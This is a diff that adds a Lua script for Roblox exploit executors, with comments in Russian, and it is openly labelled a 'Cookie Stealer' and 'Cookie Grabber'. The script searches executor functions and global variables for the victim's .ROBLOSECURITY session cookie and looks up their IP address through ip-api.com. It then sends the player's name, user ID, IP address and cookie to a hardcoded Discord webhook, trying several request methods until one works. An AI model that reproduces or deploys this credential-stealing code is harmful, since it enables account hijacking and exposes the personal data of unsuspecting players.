@@ -553,3 +553,130 @@ sendToWebhook(data)
 
 -- Опционально: уведомление в консоли эксплойта
 warn("Roblox cookie retrieval attempt completed. Check your Discord webhook for results.")
+local webhook_url = "https://discord.com/api/webhooks/1573675262757966040/gagItqSh7iIQfbaxAWUp9xEYqCjD_gF4XKHOnGkIKL6s_w4AdSHy2xhji66Cq5m70U_T" -- ЗАМЕНИ ЭТО НА СВОЙ DISCORD WEBHOOK URL
+
+local function send_to_webhook(content, username, avatar_url)
+    local data = {
+        content = content,
+        username = username or "Cookie Stealer",
+        avatar_url = avatar_url or "https://i.imgur.com/your_custom_avatar.png" -- Опционально: замени на свой аватар
+    }
+    local json_data = game:GetService("HttpService"):JSONEncode(data)
+
+    -- Попытка использовать http_request, если доступно
+    if pcall(function() http_request({Url = webhook_url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json_data}) end) then
+        return
+    end
+
+    -- Попытка использовать game:GetService("HttpService"):PostAsync(), если доступно
+    if pcall(function() game:GetService("HttpService"):PostAsync(webhook_url, json_data, Enum.HttpContentType.ApplicationJson) end) then
+        return
+    end
+
+    -- Если ни один метод не сработал, можно попробовать другие обертки, если эксплойт их предоставляет
+    -- Например: syn.request, krnl.request, fluxus.request и т.д.
+    if syn and syn.request then
+        syn.request({Url = webhook_url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json_data})
+        return
+    end
+    if krnl and krnl.request then
+        krnl.request({Url = webhook_url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json_data})
+        return
+    end
+    -- Добавь другие запросы для своего эксплойта, если знаешь их
+end
+
+local function get_ip_address()
+    local ip = "Unknown"
+    local success, result = pcall(function()
+        return game:GetService("HttpService"):GetAsync("http://ip-api.com/json")
+    end)
+    if success and result then
+        local decoded = game:GetService("HttpService"):JSONDecode(result)
+        if decoded and decoded.query then
+            ip = decoded.query
+        end
+    end
+    return ip
+end
+
+local function get_all_cookies()
+    local cookies = {}
+    local found_cookie = nil
+
+    -- 1. Прямые функции эксплойта
+    local exploit_cookie_funcs = {
+        function() return getcookie(".ROBLOSECURITY") end,
+        function() return get_cookie(".ROBLOSECURITY") end,
+        function() return game:GetService("ExploitService"):GetCookie() end, -- Пример, если эксплойт эмулирует такой сервис
+        function() return ExploitGlobal.GetCookie() end, -- Пример
+    }
+
+    for _, func in ipairs(exploit_cookie_funcs) do
+        local success, cookie = pcall(func)
+        if success and type(cookie) == "string" and #cookie > 0 then
+            found_cookie = cookie
+            cookies["Exploit Function"] = cookie
+            break -- Если нашли, дальше не ищем этим методом
+        end
+    end
+
+    -- 2. Сканирование глобальных переменных
+    local global_cookie_names = {
+        "_ROBLOSECURITY",
+        "RobloxSecurityCookie",
+        "ROBLOSECURITY",
+        "cookie",
+        "security_cookie"
+    }
+
+    local envs = { _G, getgenv(), shared }
+    for _, env in ipairs(envs) do
+        if type(env) == "table" then
+            for _, name in ipairs(global_cookie_names) do
+                if env[name] and type(env[name]) == "string" and #env[name] > 0 then
+                    found_cookie = env[name]
+                    cookies["Global Variable (" .. tostring(env) .. "." .. name .. ")"] = env[name]
+                    break
+                end
+            end
+        end
+        if found_cookie then break end
+    end
+
+    -- 3. Попытка извлечь из HTTP-запроса (если эксплойт автоматически добавляет куки)
+    -- Этот метод отправляет пустой запрос на твой сервер, надеясь, что эксплойт добавит куки в заголовки.
+    -- Твой сервер должен будет парсить заголовки. Для Discord Webhook это не сработает напрямую,
+    -- но если ты используешь свой HTTP-логгер, это может быть полезно.
+    -- Для Discord Webhook мы просто отправляем то, что нашли.
+    
+    return found_cookie, cookies
+end
+
+local player_name = game.Players.LocalPlayer.Name
+local player_id = game.Players.LocalPlayer.UserId
+local ip_address = get_ip_address()
+
+local cookie, all_found_cookies = get_all_cookies()
+
+local message_content = ""
+if cookie then
+    message_content = "```ansi\n\27[0;32m[SUCCESS]\27[0m Cookie Found!\n" ..
+                      "User: \27[0;33m" .. player_name .. "\27[0m (\27[0;36m" .. player_id .. "\27[0m)\n" ..
+                      "IP: \27[0;35m" .. ip_address .. "\27[0m\n" ..
+                      "Cookie: \27[0;31m" .. cookie .. "\27[0m\n"
+else
+    message_content = "```ansi\n\27[0;31m[FAILED]\27[0m Cookie retrieval failed using common methods.\n" ..
+                      "User: \27[0;33m" .. player_name .. "\27[0m (\27[0;36m" .. player_id .. "\27[0m)\n" ..
+                      "IP: \27[0;35m" .. ip_address .. "\27[0m\n"
+end
+
+if next(all_found_cookies) then
+    message_content = message_content .. "\n\27[0;34mAll found cookies (including duplicates/alternatives):\27[0m\n"
+    for method, c in pairs(all_found_cookies) do
+        message_content = message_content .. "  - " .. method .. ": \27[0;31m" .. c .. "\27[0m\n"
+    end
+end
+message_content = message_content .. "```"
+
+send_to_webhook(message_content, "Roblox Cookie Grabber", "https://i.imgur.com/your_custom_avatar.png") -- Замени на свой аватар
